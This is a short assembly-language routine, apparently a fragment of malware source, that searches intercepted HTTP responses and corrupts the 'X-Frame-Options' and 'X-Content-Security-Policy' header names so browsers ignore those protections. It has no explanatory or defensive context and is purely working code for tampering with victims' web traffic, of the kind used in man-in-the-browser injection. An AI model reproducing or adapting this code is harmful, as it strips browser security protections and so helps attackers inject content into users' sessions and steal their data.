
.code

;; ==================================================================================================== ;;
;; FixHeaders -                                                                                         ;;
;; __in lpData - data ptr                                                                               ;;
;; __in dwLen  - data len                                                                               ;;
;; ==================================================================================================== ;;
FixHeaders proc lpData, dwLen : dword

	invokx  &StrIPos[ebx], lpData, dwLen, "HTTP", 4
	jmpz eax, @ret


	invokx  &StrIPos[ebx], lpData, dwLen, "\r\n\r\n", 4
	jmpz eax, @F
	sub  eax, lpData
	mov  dwLen, eax


@@:	invokx  &StrIPos[ebx], lpData, dwLen, "\r\nX-Frame-Options: ", 19
	jmpz eax, @ret
	mov  dword ptr [eax+2], "g-yM"


	invokx  &StrIPos[ebx], lpData, dwLen, "\r\nX-Content-Security-Policy: ", 29
	jmpz eax, @ret
	mov  dword ptr [eax+2], "illI"


@ret:
	ret
FixHeaders endp

